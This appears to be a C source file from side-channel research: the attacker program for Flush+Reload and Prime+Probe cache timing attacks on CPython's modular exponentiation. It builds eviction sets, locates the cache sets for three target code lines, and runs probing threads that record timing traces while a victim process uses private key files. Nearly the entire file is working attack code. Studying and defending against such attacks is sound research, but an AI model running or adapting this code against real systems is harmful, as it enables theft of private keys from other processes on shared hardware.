#include "cpython_pow.h"

#include "arch.h"
#include "cache.h"
#include "cache/evset.h"
#include "cache/helper_thread.h"
#include "prime_probe.h"
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "config.h"
#include "dsp.h"
#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "shared_memory.h"

#define CACHE_LINE_COUNT (3)
#define PROFILE_ITERATIONS (1 << 14)

CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE);
sync_ctx_t sync_ctx;
uint64_t victim_runs = 1;

static uint64_t tsc_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];
static uint64_t lat_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];

static double cz_freq = 18.46, aw_freq = 18.18, at_freq = 18.18,
              aw_side_freq = 3.15, at_side_freq = 3.15;

static const char *key_path_cz =
    "experiments/cpython_pow/private_10+.pem";
static const char *key_path_aw =
    "experiments/cpython_pow/private_1+.pem";
static const char *key_path_at =
    "experiments/cpython_pow/private_(10000)+.pem";

/* PS-mode pointer arrays, assigned at the start of PS_profile_pow(). */
static uint64_t *sample_tsc[CACHE_LINE_COUNT];
static uint64_t *probe_time[CACHE_LINE_COUNT];
static uint64_t *reload_time[CACHE_LINE_COUNT];

enum {
	cache_line_count = CACHE_LINE_COUNT,
	profile_iterations = PROFILE_ITERATIONS
};
static const uint64_t max_exec_cycles = (uint64_t)3e9;
static const char *test_name = "cpython_pow";
static pthread_barrier_t attacker_threads_barrier;

void FF_profile_pow() {
	static const uint64_t waiting_time = 80000;

	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
		sample_tsc[i] = tsc_buffer + i * PROFILE_ITERATIONS;
		reload_time[i] = lat_buffer + i * PROFILE_ITERATIONS;
	}

	init_sync_ctx(CPYTHON_PROJ_ID);

	log_info("Wait for victim initialization");

	pthread_barrier_wait(sync_ctx.barrier);

	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET)

	for (int i = 0; i < (int)victim_runs; ++i) {
		log_info("Attacker Iteration %d", i);

		int index = 0;
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier);

		while (index < PROFILE_ITERATIONS) {
			FLUSH_CACHE_LINE(consume_zero, 2);
			FLUSH_CACHE_LINE(absorb_window, 2);
			FLUSH_CACHE_LINE(absorb_trailing, 2);

			FR_wait(waiting_time);

			RELOAD_CACHE_LINE(consume_zero, 2, 0);
			RELOAD_CACHE_LINE(absorb_window, 2, 1);
			RELOAD_CACHE_LINE(absorb_trailing, 2, 2);

			++index;
		}

		if (sync_ctx_get_action() == SYNC_CTX_START) {
			log_warn("Insufficient profiler iterations");
		}

		pthread_barrier_wait(sync_ctx.barrier);

		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      reload_time,
		                      CACHE_LINE_COUNT,
		                      index,
		                      index == 0);

		memset(tsc_buffer, 0, sizeof(tsc_buffer));
		memset(lat_buffer, 0, sizeof(lat_buffer));
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

typedef struct {
	uint32_t page_slot;
	const char *key_path;
	const char *label;
	int (*check_fn)(uint64_t *, uint32_t);
} csi_params_t;

static int check_gap_cz(uint64_t *p, uint32_t n) {
	return check_cpython_pow_gap_alt(p, n, 110000, 40000);
}
static int check_gap_aw(uint64_t *p, uint32_t n) {
	return check_cpython_pow_gap(p, n, 150000, 4096, 2, 4);
}
static int check_gap_at(uint64_t *p, uint32_t n) {
	return check_cpython_pow_gap(p, n, 150000, 3072, 3, 3);
}

static EVSet *identify_one_target(const csi_params_t *p,
                                  uint64_t *id_tsc_buf,
                                  uint64_t *id_probe_buf,
                                  int *l3_index_out) {
	config_t *cfg = get_config();
	uint64_t *id_sample_tsc[1] = { id_tsc_buf };
	uint64_t *id_probe_time[1] = { id_probe_buf };

	snprintf((char *)sync_ctx.data,
	         sync_ctx_data_size,
	         "%s/%s",
	         cfg->project_root,
	         p->key_path);
	sync_ctx_set_action(SYNC_CTX_SET_KEY);
	log_info("set key start barrier %lu", rdtscp());
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("set key start barrier done %lu", rdtscp());

	log_info("set key end barrier %lu", rdtscp());
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("set key end barrier done %lu", rdtscp());

	EVSet *evset = NULL;
	/* { */
	/* 	helper_thread_ctrl hctrl; */
	/* 	start_helper_thread(&hctrl); */
	/* 	evset = prepare_evset( */
	/* 	    (uint8_t *)(target_absorb_window + 2 * CACHE_LINE_SIZE), &hctrl); */
	/* } */
	for (int l3_set = 0; l3_set < (int)cfg->l3.sets; ++l3_set) {
		if ((uint32_t)(l3_set % NUM_PAGE_SLOTS) != p->page_slot) {
			continue;
		}

		log_debug("%s l3_set: %x", p->label, l3_set);

		evset = get_sf_kth_evset(l3_set);

		if (!evset) {
			log_error("Cannot build evset for set %d", l3_set);
			continue;
		}

		memset(id_tsc_buf, 0, sizeof(uint64_t) * PROFILE_ITERATIONS);
		memset(id_probe_buf, 0, sizeof(uint64_t) * PROFILE_ITERATIONS);

		PS_profile_once(evset,
		                0,
		                PROFILE_ITERATIONS,
		                max_exec_cycles,
		                id_sample_tsc,
		                id_probe_time);

		int sample_cnt = 0;
		while (sample_cnt < PROFILE_ITERATIONS && id_tsc_buf[sample_cnt] != 0) {
			++sample_cnt;
		}

		log_info("Check %s Set: %d(%x), Count %d",
		         p->label,
		         l3_set,
		         l3_set,
		         sample_cnt);

		if (sample_cnt > 256) {
			dump_profiling_trace(
			    test_name, l3_set, id_sample_tsc, id_probe_time, 1, sample_cnt);
			if (p->check_fn(id_tsc_buf, sample_cnt)) {
				*l3_index_out = l3_set;
				log_info(LOG_BOLD_ON
				         "Find %s evset Set: %d %p, Count %d" LOG_BOLD_OFF,
				         p->label,
				         l3_set,
				         evset,
				         sample_cnt);
				return evset;
			}
		}
	}
	return NULL;
}

static int identify_cpython_target_sets(EVSet **evset_cz,
                                        EVSet **evset_aw,
                                        EVSet **evset_at) {
	log_info("l2 thres %d, interrupt thres %d",
	         detected_cache_lats.l2_thresh,
	         detected_cache_lats.interrupt_thresh);

	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper!\n");
		return 0;
	}

	static uint64_t id_tsc_buf[PROFILE_ITERATIONS];
	static uint64_t id_probe_buf[PROFILE_ITERATIONS];

	csi_params_t targets[] = {
		{
		    ((target_consume_zero + 2 * CACHE_LINE_SIZE) & PAGE_MASK) >>
		        CACHE_LINE_BITS,
		    key_path_cz,
		    "cz",
		    check_gap_cz,
		},
		{
		    ((target_absorb_window + 2 * CACHE_LINE_SIZE) & PAGE_MASK) >>
		        CACHE_LINE_BITS,
		    key_path_aw,
		    "aw",
		    check_gap_aw,
		},
		{
		    ((target_absorb_trailing + 2 * CACHE_LINE_SIZE) & PAGE_MASK) >>
		        CACHE_LINE_BITS,
		    key_path_at,
		    "at",
		    check_gap_at,
		},
	};
	EVSet **evset_outs[] = { evset_cz, evset_aw, evset_at };
	int l3_indices[] = { -1, -1, -1 };

	log_info("cz slot %x, aw slot %x, at slot %x",
	         targets[0].page_slot,
	         targets[1].page_slot,
	         targets[2].page_slot);

	for (int i = 0; i < 3; ++i) {
		*evset_outs[i] = identify_one_target(
		    &targets[i], id_tsc_buf, id_probe_buf, &l3_indices[i]);
		if (*evset_outs[i] == NULL) {
			log_error("Could not find evset for %s", targets[i].label);
			stop_helper_thread(&hctrl);
			return 0;
		}
	}

	stop_helper_thread(&hctrl);

	log_info("Found all evsets: cz %d %p, aw %d %p, at %d %p",
	         l3_indices[0],
	         *evset_cz,
	         l3_indices[1],
	         *evset_aw,
	         l3_indices[2],
	         *evset_at);
	return 1;
}

static int
build_cpython_pow_evsets(EVSet **evset_cz, EVSet **evset_aw, EVSet **evset_at) {
	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");
		return 0;
	}

	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper!\n");
		return 0;
	}

	static const int retry = 4;
	uint8_t *targets[CACHE_LINE_COUNT] = {
		(uint8_t *)((uintptr_t)target_consume_zero + 2 * CACHE_LINE_SIZE),
		(uint8_t *)((uintptr_t)target_absorb_window + 2 * CACHE_LINE_SIZE),
		(uint8_t *)((uintptr_t)target_absorb_trailing + 2 * CACHE_LINE_SIZE),
	};
	EVSet **evsets[CACHE_LINE_COUNT] = { evset_cz, evset_aw, evset_at };
	const char *labels[CACHE_LINE_COUNT] = { "cz", "aw", "at" };

	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
		for (int r = 0; r < retry && *evsets[i] == NULL; ++r) {
			*evsets[i] = prepare_evset(targets[i], &hctrl);
		}
		if (*evsets[i] == NULL) {
			log_error("Failed to build evset for %s", labels[i]);
			stop_helper_thread(&hctrl);
			return 0;
		}
		log_info("Built evset for %s: %p", labels[i], *evsets[i]);
	}

	stop_helper_thread(&hctrl);
	return 1;
}

void PS_profile_pow(int use_csi) {
	PS_attacker_thread_config_t pt_consume_zero, pt_absorb_window,
	    pt_absorb_trailing;

	init_sync_ctx(CPYTHON_PROJ_ID);

	log_info("Sync context init barrier %lu", rdtscp());
	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Sync context init done %lu", rdtscp());

	log_info("Attacker initialization barrier %lu", rdtscp());

	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET);

	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
		sample_tsc[i] = tsc_buffer + i * PROFILE_ITERATIONS;
		probe_time[i] = lat_buffer + i * PROFILE_ITERATIONS;
	}

	EVSet *evset_cz = NULL, *evset_aw = NULL, *evset_at = NULL;
	if (use_csi) {
		if (cache_env_init(1)) {
			log_error("Failed to initialize cache env!\n");
			return;
		}
		helper_thread_ctrl hctrl;
		if (LLCF_multi_evset(0, &hctrl)) {
			log_error("Failed to build evset");
			sync_ctx_set_action(SYNC_CTX_EXIT);
			pthread_barrier_wait(sync_ctx.barrier);
			return;
		}
	} else {
		build_cpython_pow_evsets(&evset_cz, &evset_aw, &evset_at);
	}

	pthread_barrier_wait(sync_ctx.barrier);
	log_info("Attacker initialization done %lu", rdtscp());

	if (use_csi) {
		if (!identify_cpython_target_sets(&evset_cz, &evset_aw, &evset_at)) {
			log_error("Could not find target sets for cz, aw, and at");
			sync_ctx_set_action(SYNC_CTX_EXIT);
			pthread_barrier_wait(sync_ctx.barrier);
			return;
		}
		// FIXME(yayu): set key
		config_t *cfg = get_config();
		snprintf((char *)sync_ctx.data,
		         sync_ctx_data_size,
		         "%s/experiments/cpython_pow/private.pem",
		         cfg->project_root);
		sync_ctx_set_action(SYNC_CTX_SET_KEY);
		pthread_barrier_wait(sync_ctx.barrier);
		pthread_barrier_wait(sync_ctx.barrier);
	}

	if (pthread_barrier_init(
	        &attacker_threads_barrier, NULL, CACHE_LINE_COUNT) != 0) {
		log_error("Error initializing barrier\n");
		return;
	}

	PS_thread_config_init(pt_consume_zero);
	pt_consume_zero.label = "consume_zero";
	pt_consume_zero.slot = 0;
	pt_consume_zero.pin_cpu = -1;
	pt_consume_zero.target =
	    (uint8_t *)((uintptr_t)target_consume_zero + 2 * CACHE_LINE_SIZE);
	pt_consume_zero.evset = evset_cz;

	PS_thread_config_init(pt_absorb_window);
	pt_absorb_window.label = "absorb_window";
	pt_absorb_window.slot = 1;
	pt_absorb_window.pin_cpu = -1;
	pt_absorb_window.target =
	    (uint8_t *)((uintptr_t)target_absorb_window + 2 * CACHE_LINE_SIZE);
	pt_absorb_window.evset = evset_aw;

	PS_thread_config_init(pt_absorb_trailing);
	pt_absorb_trailing.label = "absorb_trailing";
	pt_absorb_trailing.slot = 2;
	pt_absorb_trailing.pin_cpu = -1;
	pt_absorb_trailing.target =
	    (uint8_t *)((uintptr_t)target_absorb_trailing + 2 * CACHE_LINE_SIZE);
	pt_absorb_trailing.evset = evset_at;

	pthread_t thread0 = 0, thread1 = 0, thread2 = 0;
	pthread_create(&thread0, NULL, PS_attacker_thread, &pt_consume_zero);
	pthread_create(&thread1, NULL, PS_attacker_thread, &pt_absorb_window);
	pthread_create(&thread2, NULL, PS_attacker_thread, &pt_absorb_trailing);

	pthread_join(thread0, NULL);
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

int main(int argc, char **argv) {
	config_t *cfg = get_config();

	int use_ff = 0, use_ps = 0, use_csi = 0;

	for (int i = 1; i < argc; ++i) {
		if (strcmp(argv[i], "-FR") == 0) {
			use_ff = 1;
		} else if (strcmp(argv[i], "-PS") == 0) {
			use_ps = 1;
		} else if (strcmp(argv[i], "-csi") == 0) {
			use_csi = 1;
		} else {
			char *endptr = NULL;
			errno = 0;
			const uint64_t value = strtoull(argv[i], &endptr, 10);
			if (errno == 0 && endptr != argv[i] && *endptr == '\0') {
				victim_runs = value;
			}
		}
	}

	if (!use_ff && !use_ps) {
		log_error("Usage: %s [-FR | -PS] [-csi] [iterations]", argv[0]);
		exit(1);
	}

	if (use_ff && use_ps) {
		log_error("Cannot specify both -FR and -PS");
		exit(1);
	}

	if (victim_runs == 0) {
		log_error("python iterations has to be non-zero");
		exit(1);
	}

	if (use_ff) {
		FF_profile_pow();
	} else {
		PS_profile_pow(use_csi);
	}

	return 0;
}
